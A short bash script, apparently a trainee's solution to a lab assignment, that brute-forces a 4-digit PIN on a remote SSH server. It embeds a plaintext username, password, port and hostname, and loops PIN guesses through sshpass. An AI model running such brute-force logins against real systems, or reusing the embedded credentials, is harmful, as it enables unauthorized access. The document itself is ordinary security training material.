#!/bin/bash

# TBD

# ## Assignment 2: Brute-force over SSH

# For this assignment, you will need to guess a 4-digit pin to gain access to a
# remote machine, over SSH. While you could try to guess it by hand, why not 
# write a bash script that automates typing in all 10,000 different possibilities
# for you?

# ### Credentials

# The username, password, port and hostname will all be provided for you
# offline. Use `man ssh` to determine how to specify these credentials, and log
# into the box.

# ### Pin Verification

# After logging in, you will be prompted to enter the 4-digit pin. The pin has 4
# digits, thus lies in the range of 0000-9999. If the pin is incorrect, your ssh
# connection will be terminated, so you'll have log back in to guess again.
# When you get the pin correct, you will receive a secret token, along with access
# to the server.


function logIntoServer {

user="lasp_trainee"
psswd="LASP_bash_2018"
port="10022"
host="nzimm.net"

sshpass -p "$psswd" ssh "$user"@"$host" -T -p "$port" 
}

# pinGuess=0000

# # STDIN attempt
# echo "$pinGuess" | logIntoServer


for pinGuess in $(seq -w 2000 2999); do
	echo "$pinGuess" | logIntoServer | grep -A100000 'Enter the '

done
